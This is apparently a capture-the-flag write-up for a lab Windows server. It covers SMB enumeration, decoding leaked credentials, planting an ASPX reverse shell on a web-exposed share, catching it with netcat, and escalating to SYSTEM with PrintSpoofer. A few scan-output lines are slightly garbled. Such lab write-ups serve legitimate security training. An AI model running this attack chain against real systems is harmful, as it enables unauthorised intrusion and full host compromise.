### Relevant

> Windows machine

`export ip=10.10.148.67`

------------------------------------------

### Reconnaissance

#### Nmap

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/relevant]
└─$ nmap -sC -sV -oN nmap/initial $ip                                                                                                                        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-17 21:01 IST                                                                                           
Stats: 0:01:09 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan                                                                                   
NSE Timing: About 95.00% done; ETC: 21:02 (0:00:00 remaining)                                                                                                
Stats: 0:01:09 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan                                                                                   
NSE Timing: About 97.50% done; ETC: 21:02 (0:00:00 remaining)
Nmap scan report for 10.10.148.67
Host is up (0.18s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2024-05-16T15:30:08
|_Not valid after:  2024-11-15T15:30:08
|_ssl-date: 2024-05-17T15:32:55+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2024-05-17T15:32:15+00:00
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h24m00s, deviation: 3h07m50s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-05-17T08:32:17-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-05-17T15:32:18
|_  start_date: 2024-05-17T15:30:10

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.21 seconds
```

> Here, nmap scans most common 1000 ports - Try running it on all ports

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/relevant]
└─$ nmap -sC -sV -p- 10.10.218.152
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-18 18:00 IST
Nmap scan report for 10.10.218.152
Host is up (0.18s latency).
Not shown: 65526 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE                                                                                                                         
|_http-title: IIS Windows Server                                                                                                                             
|_http-server-header: Microsoft-IIS/10.0                                                                                                                     
135/tcp   open  msrpc         Microsoft Windows RPC                                                                                                          
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                                  
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2024-05-17T12:03:40
|_Not valid after:  2024-11-16T12:03:40
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2024-05-18T12:37:29+00:00
|_ssl-date: 2024-05-18T12:38:08+00:00; 0s from scanner time.
se/tcp open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h24m00s, deviation: 3h07m51s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-05-18T12:37:31
|_  start_date: 2024-05-18T12:03:58
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00se
|_  System time: 2024-05-18T05:37:32-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 456.68 seconds
```

Port 49663, 49667, 49668, 49670 are also open - port 49663 is hosting web server

#### SMB recon

Found SMB server, use smbclient (or) nmap smb nse script

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/relevant]
└─$ smbclient -L 10.10.218.152
Password for [WORKGROUP\edith]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.218.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

─$ smbclient //10.10.148.67/nt4wrksv                                                                                                                        
Password for [WORKGROUP\edith]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri May 17 21:20:19 2024
  ..                                  D        0  Fri May 17 21:20:19 2024
  passwords.txt                       A       98  Sat Jul 25 20:45:33 2020
ca
                7735807 blocks of size 4096. 5138499 blocks available
smb: \> get passwords.txt 
getting file \passwords.txt of size 98 as passwords.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> exit

┌──(edith🛸HackBox)-[~/pwn/vuln_machines/relevant]
└─$ cat passwords.txt                                                                                                                                        
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```

Decode the text..

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/relevant]
└─$ echo 'Qm9iIC0gIVBAJCRXMHJEITEyMw==' | base64 -d
Bob -   
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/relevant]
└─$ echo 'QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk' | base64 -d                                                                                              
Bill - Juw4nnaM4n420696969!$$$
```

Try using this on rdp - Failed :( may be rabbithole...

```
┌──(edith🛸HackBox)-[~]
└─$ xfreerdp /u:Bob /p:!P@$$W0rD!123 /v:10.10.218.152                                                                                                      
bash: !P@: event not found
┌──(edith🛸HackBox)-[~]
└─$ xfreerdp /u:Bob /p:'!P@$$W0rD!123' /v:10.10.218.152                                                                                                   
[18:23:38:325] [208404:208405] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[18:23:38:325] [208404:208405] [WARN][com.freerdp.crypto] - CN = Relevant
[18:23:39:927] [208404:208405] [ERROR][com.freerdp.core.transport] - BIO_read returned a system error 104: Connection reset by peer
[18:23:39:927] [208404:208405] [ERROR][com.freerdp.core] - transport_read_layer:freerdp_set_last_error_ex ERRCONNECT_CONNECT_TRANSPORT_FAILED [0x0002000D]
[18:23:41:666] [208404:208405] [ERROR][com.freerdp.core.transport] - BIO_read returned a system error 104: Connection reset by peer
[18:23:41:666] [208404:208405] [ERROR][com.freerdp.core] - transport_read_layer:freerdp_set_last_error_ex ERRCONNECT_CONNECT_TRANSPORT_FAILED [0x0002000D]
[18:23:41:666] [208404:208405] [ERROR][com.freerdp.core] - freerdp_post_connect failed


┌──(edith🛸HackBox)-[~]
└─$ xfreerdp /u:Bill /p:'Juw4nnaM4n420696969!$$$' /v:10.10.218.152

[18:26:24:022] [210034:210035] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[18:26:24:022] [210034:210035] [WARN][com.freerdp.crypto] - CN = Relevant
[18:26:25:824] [210034:210035] [ERROR][com.freerdp.core] - transport_ssl_cb:freerdp_set_last_error_ex ERRCONNECT_PASSWORD_CERTAINLY_EXPIRED [0x0002000F]
[18:26:25:824] [210034:210035] [ERROR][com.freerdp.core.transport] - BIO_read returned an error: error:0A000438:SSL routines::tlsv1 alert internal error
```

### Directory Bruteforce

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/relevant]
└─$ feroxbuster -u http://10.10.218.152/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --depth=2 -C=404

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.218.152/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 2
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      334l     2089w   180418c http://10.10.218.152/iisstart.png
200      GET       32l       55w      703c http://10.10.218.152/
400      GET       80l      276w     3420c http://10.10.218.152/*checkout*
400      GET       80l      276w     3420c http://10.10.218.152/*docroot*
400      GET       80l      276w     3420c http://10.10.218.152/*
400      GET       80l      276w     3420c http://10.10.218.152/http%3A%2F%2Fwww
400      GET       80l      276w     3420c http://10.10.218.152/http%3A
400      GET       80l      276w     3420c http://10.10.218.152/q%26a
400      GET       80l      276w     3420c http://10.10.218.152/**http%3a
400      GET       80l      276w     3420c http://10.10.218.152/*http%3A
400      GET       80l      276w     3420c http://10.10.218.152/**http%3A
400      GET       80l      276w     3420c http://10.10.218.152/http%3A%2F%2Fyoutube
400      GET       80l      276w     3420c http://10.10.218.152/http%3A%2F%2Fblogs
400      GET       80l      276w     3420c http://10.10.218.152/http%3A%2F%2Fblog
400      GET       80l      276w     3420c http://10.10.218.152/**http%3A%2F%2Fwww
400      GET       80l      276w     3420c http://10.10.218.152/s%26p
400      GET       80l      276w     3420c http://10.10.218.152/%3FRID%3D2671
400      GET       80l      276w     3420c http://10.10.218.152/devinmoore*
400      GET       80l      276w     3420c http://10.10.218.152/200109*
400      GET       80l      276w     3420c http://10.10.218.152/*sa_
400      GET       80l      276w     3420c http://10.10.218.152/*dc_
400      GET       80l      276w     3420c http://10.10.218.152/http%3A%2F%2Fcommunity
400      GET       80l      276w     3420c http://10.10.218.152/Chamillionaire%20%26%20Paul%20Wall-%20Get%20Ya%20Mind%20Correct
400      GET       80l      276w     3420c http://10.10.218.152/Clinton%20Sparks%20%26%20Diddy%20-%20Dont%20Call%20It%20A%20Comeback%28RuZtY%29
400      GET       80l      276w     3420c http://10.10.218.152/DJ%20Haze%20%26%20The%20Game%20-%20New%20Blood%20Series%20Pt
400      GET       80l      276w     3420c http://10.10.218.152/http%3A%2F%2Fradar
400      GET       80l      276w     3420c http://10.10.218.152/q%26a2
400      GET       80l      276w     3420c http://10.10.218.152/login%3f
400      GET       80l      276w     3420c http://10.10.218.152/Shakira%20Oral%20Fixation%201%20%26%202
400      GET       80l      276w     3420c http://10.10.218.152/http%3A%2F%2Fjeremiahgrossman
400      GET       80l      276w     3420c http://10.10.218.152/http%3A%2F%2Fweblog
400      GET       80l      276w     3420c http://10.10.218.152/http%3A%2F%2Fswik
[####################] - 22m   220549/220549  0s      found:32      errors:801    
[####################] - 22m   220546/220546  168/s   http://10.10.218.152/                                         
```

Nothing found!

Try directory bruteforcing on webserver running on port 49663

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/relevant]
└─$ feroxbuster -u http://10.10.20.234:49663/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -t 100 -C 404 -C 503 -n                      

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.2
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.20.234:49663/
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 💢  Status Code Filters   │ [404, 503]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.2
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      334l     2089w   180418c http://10.10.20.234:49663/iisstart.png
200      GET       32l       55w      703c http://10.10.20.234:49663/
400      GET       80l      276w     3420c http://10.10.20.234:49663/*checkout*
400      GET       80l      276w     3420c http://10.10.20.234:49663/*docroot*
400      GET       80l      276w     3420c http://10.10.20.234:49663/*
400      GET       80l      276w     3420c http://10.10.20.234:49663/http%3A%2F%2Fwww
400      GET       80l      276w     3420c http://10.10.20.234:49663/http%3A
400      GET       80l      276w     3420c http://10.10.20.234:49663/q%26a
400      GET       80l      276w     3420c http://10.10.20.234:49663/**http%3a
400      GET       80l      276w     3420c http://10.10.20.234:49663/*http%3A
400      GET       80l      276w     3420c http://10.10.20.234:49663/**http%3A
400      GET       80l      276w     3420c http://10.10.20.234:49663/http%3A%2F%2Fyoutube
400      GET       80l      276w     3420c http://10.10.20.234:49663/http%3A%2F%2Fblogs
400      GET       80l      276w     3420c http://10.10.20.234:49663/http%3A%2F%2Fblog
400      GET       80l      276w     3420c http://10.10.20.234:49663/**http%3A%2F%2Fwww
400      GET       80l      276w     3420c http://10.10.20.234:49663/s%26p
400      GET       80l      276w     3420c http://10.10.20.234:49663/%3FRID%3D2671
400      GET       80l      276w     3420c http://10.10.20.234:49663/devinmoore*
400      GET       80l      276w     3420c http://10.10.20.234:49663/200109*
400      GET       80l      276w     3420c http://10.10.20.234:49663/*sa_
400      GET       80l      276w     3420c http://10.10.20.234:49663/*dc_
400      GET       80l      276w     3420c http://10.10.20.234:49663/http%3A%2F%2Fcommunity
400      GET       80l      276w     3420c http://10.10.20.234:49663/Clinton%20Sparks%20%26%20Diddy%20-%20Dont%20Call%20It%20A%20Comeback%28RuZtY%29
400      GET       80l      276w     3420c http://10.10.20.234:49663/Chamillionaire%20%26%20Paul%20Wall-%20Get%20Ya%20Mind%20Correct
400      GET       80l      276w     3420c http://10.10.20.234:49663/DJ%20Haze%20%26%20The%20Game%20-%20New%20Blood%20Series%20Pt
400      GET       80l      276w     3420c http://10.10.20.234:49663/http%3A%2F%2Fradar
400      GET       80l      276w     3420c http://10.10.20.234:49663/q%26a2
400      GET       80l      276w     3420c http://10.10.20.234:49663/login%3f
400      GET       80l      276w     3420c http://10.10.20.234:49663/Shakira%20Oral%20Fixation%201%20%26%202
400      GET       80l      276w     3420c http://10.10.20.234:49663/http%3A%2F%2Fjeremiahgrossman
400      GET       80l      276w     3420c http://10.10.20.234:49663/http%3A%2F%2Fweblog
400      GET       80l      276w     3420c http://10.10.20.234:49663/http%3A%2F%2Fswik
301      GET        2l       10w      158c http://10.10.20.234:49663/nt4wrksv => http://10.10.20.234:49663/nt4wrksv/
[####################] - 21m   220550/220550  0s      found:32      errors:2085   
[####################] - 21m   220546/220546  176/s   http://10.10.20.234:49663/                                               
```

> We can found one intresting directory - http://10.10.20.234:49663/nt4wrksv

nt4wrksv is share which we already discovered in smb enumeration, try accessing the passwords.txt file present in nt4wrksv share via web browser it loads passwords.txt file - Success! :) ==> Try Exploiting it

### Initial access

upload aspx reverseh shell in smb nt4wrksv share

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/relevant]
└─$ smbclient //10.10.66.192/nt4wrksv
Password for [WORKGROUP\edith]:
Try "help" to get a list of possible commands.
smb: \> put shell.aspx 
putting file shell.aspx as \shell.aspx (18.3 kb/s) (average 18.3 kb/s)
smb: \> ls
  .                                   D        0  Sun May 19 20:56:26 2024
  ..                                  D        0  Sun May 19 20:56:26 2024
  passwords.txt                       A       98  Sat Jul 25 20:45:33 2020
  shell.aspx                          A    15971  Sun May 19 20:56:27 2024

                7735807 blocks of size 4096. 4949259 blocks available
smb: \> 
```

Access the uploaded reverse shell via web browser

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/relevant]
└─$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.17.49.246] from (UNKNOWN) [10.10.66.192] 49766
Spawn Shell...
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool

c:\windows\system32\inetsrv>
```

### Privilege escalation

Run whoami /priv to check for privileges we have (OR) run winpeas

```
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

SeImpersonatePrivilege enabled - On checking internet, found that it can be exploited using JuicyPotato, RoguePotato, SharpEfsPotato, GodPotato and PrintSpoofer.

Try Exploiting it using printspoofer exploit 

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/relevant]
└─$ smbclient //10.10.66.192/nt4wrksv                                                                                                                        
Password for [WORKGROUP\edith]:
Try "help" to get a list of possible commands.
smb: \> put PrintSpoofer64.exe 
putting file PrintSpoofer64.exe as \PrintSpoofer64.exe (35.1 kb/s) (average 35.1 kb/s)
smb: \> ls
  .                                   D        0  Sun May 19 21:35:35 2024
  ..                                  D        0  Sun May 19 21:35:35 2024
  passwords.txt                       A       98  Sat Jul 25 20:45:33 2020
  PrintSpoofer64.exe                  A    27136  Sun May 19 21:35:35 2024
  shell.aspx                          A    15971  Sun May 19 20:56:27 2024

                7735807 blocks of size 4096. 5137446 blocks available
smb: \> 
```

Navigate to the directory - Usually iis webs server data stored in C:/inetpub/

On exploring this, found our share nt4wrksv which has our uploaded file - execute it for token impersoanation ==> Sucess :)

```
C:\inetpub\wwwroot\nt4wrksv>PrintSpoofer64.exe -i -c cmd
PrintSpoofer64.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
